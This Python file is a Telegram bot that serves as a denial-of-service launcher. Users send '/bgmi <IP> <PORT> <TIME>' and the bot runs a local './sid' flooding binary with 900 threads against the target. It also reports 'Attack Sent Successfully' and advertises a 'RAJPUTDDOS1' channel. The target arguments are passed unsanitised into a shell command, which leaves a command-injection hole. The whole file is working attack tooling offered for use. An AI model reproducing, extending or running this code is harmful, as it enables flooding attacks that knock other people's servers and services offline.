import asyncio
import logging
import json
import telebot
from threading import Thread, Lock
from queue import Queue

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
bot = telebot.TeleBot(BOT_TOKEN)

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
active_attacks = {}  # Track active attacks
lock = Lock()  # For thread safety
attack_queue = Queue()  # Queue for managing attack requests
max_concurrent_attacks = 4  # Maximum number of concurrent attacks
loop = asyncio.new_event_loop()  # Create a new event loop

# Number of threads to use for attacks
THREADS = 900

# Set up logging
logging.basicConfig(level=logging.INFO)

# Async function to run attack command
async def run_attack_command_on_codespace(bot: telebot.TeleBot, target_ip: str, target_port: int, duration: int, chat_id: int):
    command = f"./sid  {target_ip} {target_port} {duration} {THREADS}"  # Include threads in the command
    logging.info(f"Running command: {command}")
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}. Command: {command}")

        # Notify user when the attack finishes
        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀 https://t.me/RAJPUTDDOS1 ")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
        bot.send_message(chat_id, "❌ An error occurred while executing the attack command. Please try again later.")

def process_attack_queue():
    while True:
        user_id, target_ip, target_port, duration, chat_id = attack_queue.get()
        with lock:
            active_attacks[user_id] = True  # Mark the user as having an active attack
        
        try:
            asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(bot, target_ip, target_port, duration, chat_id), loop)
            bot.send_message(chat_id, f"🚀 Attack Sent Successfully! 🚀\n\nTarget: {target_ip}:{target_port}\nAttack Time: {duration} seconds https://t.me/RAJPUTDDOS1 \n")
        except Exception as e:
            logging.error(f"Error during attack processing: {e}")
        finally:
            with lock:
                active_attacks.pop(user_id, None)  # Reset user state after processing
            attack_queue.task_done()  # Signal that the task is complete

# Attack command
@bot.message_handler(commands=['bgmi'])
def attack_command(message):
    logging.info(f"Received command from user {message.from_user.id}: {message.text}")
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        args = message.text.split()[1:]  # Get arguments after the command
        if len(args) != 3:
            bot.send_message(chat_id, "*Please use:\n /bgmi  <IP>  <PORT>  <TIME> (https://t.me/RAJPUTDDOS1)*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        if len(active_attacks) >= max_concurrent_attacks:
            bot.send_message(chat_id, "*Maximum number of concurrent attacks reached. Please try again later.*", parse_mode='Markdown')
            return

        attack_queue.put((user_id, target_ip, target_port, duration, chat_id))

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "❌ An error occurred while processing your command. Please try again later.")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

# Start the bot
if __name__ == '__main__':
    thread = Thread(target=start_asyncio_thread)
    thread.start()
    
    # Start the processing thread for the attack queue
    Thread(target=process_attack_queue, daemon=True).start()
    
    bot.polling()
